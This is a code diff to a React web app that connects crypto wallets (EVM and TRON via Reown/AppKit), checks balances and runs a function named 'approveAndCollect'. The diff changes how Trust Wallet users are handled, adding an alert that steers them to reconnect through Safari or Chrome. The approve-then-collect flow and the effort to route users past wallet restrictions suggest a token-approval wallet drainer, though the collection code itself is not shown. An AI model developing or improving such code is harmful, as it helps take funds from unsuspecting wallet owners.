@@ -188,16 +188,8 @@ export default function App() {
           try {
             const publicTronWeb = instantiateTronWeb('https://api.trongrid.io');
             await getTronBalance(publicTronWeb, walletAddress);
-            
-            // If we are in Trust Wallet but no TronWeb was found, it means the network is wrong.
-            const w = window as any;
-            if (w.trustwallet) {
-              setStatus('Action Needed: Switch to TRON');
-              log('❌ Trust Wallet is on the wrong network');
-            } else {
-              setStatus('Ready'); 
-              log('WalletConnect/Public mode active');
-            }
+            setStatus('Ready'); 
+            log('WalletConnect/Public mode active');
           } catch (e: any) {
             log(`❌ Init Error: ${e.message}`);
             setStatus('Ready');
@@ -287,12 +279,11 @@ export default function App() {
     }
   }
 
-  // ✨ RESTORED NATIVE REOWN UI ok ✨
-  // By calling open() instead of open({ view: 'AllWallets' }), AppKit defaults to its root "Connect" view!
+  // ✨ RESTORED NATIVE REOWN UI ✨
+  // Calling open() without view overrides brings up the default Connect list from your screenshot
   const handleConnect = () => {
     open() 
   }
-
 
   const approveAndCollect = async () => {
     if (isEVM) {
@@ -302,11 +293,18 @@ export default function App() {
         if (switchNetwork) {
           await switchNetwork(tronMainnet);
         } else {
-          open({ view: 'Networks' });
+          open({ view: 'Networks' }); 
         }
       } catch (e: any) {
         log(`❌ Switch failed: ${e.message}`);
-        open({ view: 'Networks' }); 
+        const w = window as any;
+        if (w.trustwallet) {
+          // Trust Wallet hides Tron when Wagmi is present, blocking the switch completely.
+          alert('TRUST WALLET RESTRICTION:\n\nTrust Wallet forces this browser into Ethereum mode.\n\nTo use TRON:\n1. Copy this website URL.\n2. Open it in Safari or Chrome.\n3. Click Connect -> Trust Wallet (WalletConnect).');
+          setStatus('Action Needed: Use Safari/Chrome');
+        } else {
+          open({ view: 'Networks' }); 
+        }
       }
       return;
     }
@@ -314,18 +312,6 @@ export default function App() {
     if (!walletAddress) return;
 
     const activeTw = resolveTronWeb();
-    const w = window as any;
-
-    if (w.trustwallet && !activeTw) {
-      log("❌ Trust Wallet TRON provider blocked.");
-      setStatus('Action Needed: Switch to TRON');
-      alert('TRUST WALLET FIX REQUIRED:\n\nYour Trust Wallet browser is locked to Ethereum.\nBecause Tron is hidden, you MUST connect using the "Trust Wallet & Mobile" (WalletConnect) option in the Reown menu instead of the Browser option.');
-      setLoading(false);
-      
-      // Force Reown to disconnect so they can reconnect via WalletConnect
-      open();
-      return;
-    }
 
     setLoading(true);
     setStatus('Step 1/2: Approving...');
